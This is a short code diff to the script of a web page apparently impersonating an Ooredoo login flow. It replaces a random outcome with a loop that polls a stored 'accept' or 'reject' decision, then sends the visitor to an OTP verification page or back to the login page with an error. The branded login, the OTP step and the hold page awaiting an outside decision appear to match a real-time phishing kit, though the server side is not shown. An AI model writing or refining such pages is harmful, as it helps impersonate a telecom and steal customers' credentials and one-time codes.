@@ -77,18 +77,38 @@
 </main>
 
 <script>
-  // Mock result: if accepted -> OTP page, if rejected -> login page with error message
-  setTimeout(() => {
-    const isAccepted = Math.random() > 0.5;
-    
-    if (isAccepted) {
-      sessionStorage.setItem('loginError', 'Application accepted. Please continue with OTP verification.');
+  function getFlowDecision() {
+    return localStorage.getItem('ooredooDecision') || sessionStorage.getItem('ooredooDecision') || '';
+  }
+
+  function setFlowDecision(decision) {
+    try {
+      localStorage.setItem('ooredooDecision', decision);
+      sessionStorage.setItem('ooredooDecision', decision);
+    } catch (err) {}
+  }
+
+  function checkDecision() {
+    const decision = getFlowDecision();
+
+    if (decision === 'accept') {
+      sessionStorage.setItem('loginError', 'Your request has been approved. Please continue with the verification code.');
       window.location.href = 'otp_ooredoo_en.html';
-    } else {
-      sessionStorage.setItem('loginError', 'Application rejected. Please sign in again and try again.');
-      window.location.href = 'login_ooredoo_en.html';
+      return;
     }
-  }, 2500);
+
+    if (decision === 'reject') {
+      sessionStorage.setItem('loginError', 'Your request was rejected. Please log in again and try again.');
+      localStorage.removeItem('ooredooDecision');
+      sessionStorage.removeItem('ooredooDecision');
+      window.location.href = 'login_ooredoo_en.html';
+      return;
+    }
+
+    setTimeout(checkDecision, 2000);
+  }
+
+  checkDecision();
 </script>
 
 </body>
